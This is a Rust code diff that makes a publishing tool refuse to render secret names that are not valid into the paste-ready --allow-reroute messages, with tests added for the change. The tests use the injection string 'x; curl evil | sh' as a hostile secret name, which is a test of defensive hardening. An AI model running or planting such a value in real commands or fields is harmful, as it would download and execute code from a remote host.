@@ -136,6 +136,13 @@ pub struct RerouteRefused {
 
 impl std::fmt::Display for RerouteRefused {
     fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
+        // A name goes into a command IT may paste: only names that cannot run anything else.
+        if !self.names.iter().all(|n| secret_ref::is_valid_name(n)) {
+            return write!(
+                f,
+                "Not published: a secret would be sent somewhere new (secret_rerouted), and its name is not valid; fix the secret names (`mastersos check`) first"
+            );
+        }
         let names = self.names.join(", ");
         let flags: Vec<String> = self
             .names
@@ -362,11 +369,17 @@ pub async fn publish(
     print_local_lints(out, &lints, &snap.secrets)?;
     let rerouted = secret_ref::rerouted_names(&lints);
     for a in allow_reroute.iter().filter(|a| !rerouted.contains(*a)) {
-        writeln!(
-            out,
-            "Note: --allow-reroute {} approves nothing: no secret of that name is rerouted",
-            clean(a, &snap.secrets)
-        )?;
+        if secret_ref::is_valid_name(a) {
+            writeln!(
+                out,
+                "Note: --allow-reroute {a} approves nothing: no secret of that name is rerouted"
+            )?;
+        } else {
+            writeln!(
+                out,
+                "Note: an --allow-reroute value is not a valid secret name and approves nothing"
+            )?;
+        }
     }
     let filled = secret_ref::fill(&snap.manifest, &snap.secrets).map_err(CheckFailed)?;
     let files = &snap.files;
@@ -660,6 +673,50 @@ mod tests {
             .downcast_ref::<RerouteRefused>()
             .unwrap_or_else(|| panic!("not a reroute refusal: {err:#}"));
         assert_eq!(refused.names, ["old-corp"]);
+        assert!(s.received_requests().await.unwrap().is_empty());
+    }
+
+    #[test]
+    fn reroute_refusal_never_renders_an_invalid_name() {
+        let r = RerouteRefused {
+            names: vec!["ok-name".into(), "x; curl evil | sh".into()],
+            lints: Vec::new(),
+        };
+        let text = r.to_string();
+        assert!(
+            !text.contains("curl") && !text.contains("--allow-reroute"),
+            "{text}"
+        );
+        let r = RerouteRefused {
+            names: vec!["Upper".into()],
+            lints: Vec::new(),
+        };
+        assert!(!r.to_string().contains("Upper"));
+    }
+
+    #[tokio::test]
+    async fn shell_name_in_a_reference_blocks_publish() {
+        let s = server().await;
+        let t = tempfile::tempdir().unwrap();
+        let w = workdir(&t.path().join("school"));
+        let name = w.secrets().unwrap().keys().next().unwrap().clone();
+        let evil = "x; curl evil | sh";
+        let text = w
+            .manifest()
+            .unwrap()
+            .replace(&format!("secret:{name}"), &format!("secret:{evil}"));
+        std::fs::write(w.root.join("manifest.toml"), text).unwrap();
+        std::fs::write(
+            w.root.join("secrets.toml"),
+            format!("\"{evil}\" = \"guestpass1\"\n"),
+        )
+        .unwrap();
+        let (r, out) = run_allow(&s, &w, &[evil]).await;
+        let err = r.unwrap_err();
+        let failed = err.downcast_ref::<CheckFailed>().expect("a check failure");
+        assert!(failed.0.iter().any(|l| l.code == "secret_name_invalid"));
+        let all = format!("{err:#} {:?} {out}", failed.0);
+        assert!(!all.contains("curl"), "{all}");
         assert!(s.received_requests().await.unwrap().is_empty());
     }
 
